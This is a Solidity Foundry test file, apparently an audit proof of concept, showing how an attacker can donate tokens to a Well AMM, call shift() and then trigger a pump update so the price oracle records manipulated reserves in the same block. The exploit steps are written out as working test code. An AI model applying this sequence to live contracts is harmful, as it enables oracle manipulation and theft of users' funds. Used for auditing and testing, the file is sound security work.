pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "src/Well.sol";
import "src/interfaces/IWellFunction.sol";

/*//////////////////////////////////////////////////////////////
                            MOCK TOKEN
//////////////////////////////////////////////////////////////*/

import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract TestToken is ERC20 {
    constructor(string memory name) ERC20(name, name) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/*//////////////////////////////////////////////////////////////
                          MOCK WELL FUNCTION
   A minimal implementation that never reverts. Rounding rules
   are irrelevant for the oracle-manipulation PoC.
//////////////////////////////////////////////////////////////*/

contract MockWellFunction is IWellFunction {
    function calcLpTokenSupply(
        uint256[] memory reserves,
        bytes memory
    ) external pure override returns (uint256 supply) {
        for (uint256 i; i < reserves.length; ++i) supply += reserves[i];
    }

    function calcReserve(
        uint256[] memory reserves,
        uint256 j,
        uint256, /* lpTokenSupply (unused) */
        bytes memory
    ) external pure override returns (uint256 reserve) {
        reserve = reserves[j]; // identity mapping for simplicity
    }

    function calcLPTokenUnderlying(
        uint256 lpAmount,
        uint256[] memory reserves,
        uint256 lpTokenSupply,
        bytes memory
    ) external pure override returns (uint256[] memory amounts) {
        amounts = new uint256[](reserves.length);
        for (uint256 i; i < reserves.length; ++i) {
            amounts[i] = (lpAmount * reserves[i]) / lpTokenSupply;
        }
    }
}

/*//////////////////////////////////////////////////////////////
                             MOCK PUMP
   Records the last reserves it was fed. Nothing else.
//////////////////////////////////////////////////////////////*/

contract MockPump {
    uint256[] public lastReserves;

    function update(uint256[] memory reserves, bytes memory) external returns (bytes memory) {
        delete lastReserves;
        for (uint256 i; i < reserves.length; ++i) lastReserves.push(reserves[i]);
        return "";
    }
}

/*//////////////////////////////////////////////////////////////
                         HARNESS WELL
   Overrides the dynamic-immutable getters with simple storage
   variables so we can deploy a Well without using the factory
   infrastructure.
//////////////////////////////////////////////////////////////*/

contract TestWell is Well {
    IERC20[] private _tokens;
    address private _pump;
    address private _wf;

    constructor(IERC20[] memory tokens_, address pump_, address wf_) {
        _tokens = tokens_;
        _pump = pump_;
        _wf = wf_;
        init("Test LP", "TLP");
    }

    // ----- immutable replacement getters -----

    function tokens() public view override returns (IERC20[] memory ts) {
        return _tokens;
    }

    function numberOfTokens() public view override returns (uint256) {
        return _tokens.length;
    }

    // WELL FUNCTION DATA ----------------------------------------------------

    function wellFunctionAddress() public view override returns (address) {
        return _wf;
    }

    function wellFunctionDataLength() public pure override returns (uint256) {
        return 0;
    }

    function wellFunction() public view override returns (Call memory c) {
        c.target = _wf;
        c.data = "";
    }

    // PUMPS -----------------------------------------------------------------

    function numberOfPumps() public view override returns (uint256) {
        return 1;
    }

    function firstPump() public view override returns (Call memory p) {
        p.target = _pump;
        p.data = "";
    }

    function pumps() public view override returns (Call[] memory arr) {
        arr = new Call[](1);
        arr[0] = firstPump();
    }

    // UNUSED IMMUTABLES -----------------------------------------------------

    function aquifer() public pure override returns (address) {
        return address(0);
    }

    function wellData() public pure override returns (bytes memory) {
        return "";
    }
}

/*//////////////////////////////////////////////////////////////
                        EXPLOIT TEST CASE
//////////////////////////////////////////////////////////////*/

contract ExploitTest is Test {
    TestToken tokenA;
    TestToken tokenB;
    MockPump pump;
    MockWellFunction wf;
    TestWell well;

    address liquidityProvider = address(0xBEEF);
    address attacker = address(0xBAD);

    function setUp() public {
        // Deploy tokens
        tokenA = new TestToken("TKNA");
        tokenB = new TestToken("TKNB");

        // Mint balances
        tokenA.mint(liquidityProvider, 2_000 ether);
        tokenB.mint(liquidityProvider, 2_000 ether);
        tokenA.mint(attacker, 1_000 ether);
        tokenB.mint(attacker, 1_000 ether);

        // Deploy supporting contracts
        pump = new MockPump();
        wf = new MockWellFunction();

        // Deploy Well harness
        IERC20[] memory toks = new IERC20[](2);
        toks[0] = tokenA;
        toks[1] = tokenB;
        well = new TestWell(toks, address(pump), address(wf));

        // Provide initial liquidity: 1 000 A / 1 000 B
        vm.startPrank(liquidityProvider);
        tokenA.approve(address(well), type(uint256).max);
        tokenB.approve(address(well), type(uint256).max);

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 1_000 ether;
        amounts[1] = 1_000 ether;
        well.addLiquidity(amounts, 0, liquidityProvider, block.timestamp + 1 hours);
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                                EXPLOIT
    //////////////////////////////////////////////////////////////*/

    function testPumpManipulationViaShift() public {
        // Sanity: pump should have been fed with zero reserves during initial LP add
        assertEq(pump.lastReserves(0), 0, "baseline pump state");

        vm.startPrank(attacker);

        // 1. The attacker donates 500 TokenA directly to the Well
        tokenA.transfer(address(well), 500 ether); // balanceOfâ†‘, reserves unchanged

        // 2. shift() stores MANIPULATED reserves but **does not update pumps**
        well.shift(IERC20(address(tokenB)), 0, attacker);

        // Reserves inside storage are now inconsistent with balances before the call
        uint256[] memory manipulatedReserves = well.getReserves();
        assertEq(manipulatedReserves[0], 1_500 ether, "manipulated reserve A");

        // 3. Any normal state-changing function (e.g., addLiquidity) calls _updatePumps()
        //    which blindly forwards the manipulated reserves to the oracle.
        uint256[] memory zeroAmounts = new uint256[](2);
        well.addLiquidity(zeroAmounts, 0, attacker, block.timestamp + 1 hours);

        vm.stopPrank();

        // Pump reflects the attacker-controlled reserves even though they were set
        // in the SAME BLOCK and without any historical reference.
        assertEq(pump.lastReserves(0), 1_500 ether, "pump reserve A manipulated");
        assertEq(pump.lastReserves(1), manipulatedReserves[1], "pump reserve B manipulated");
    }
}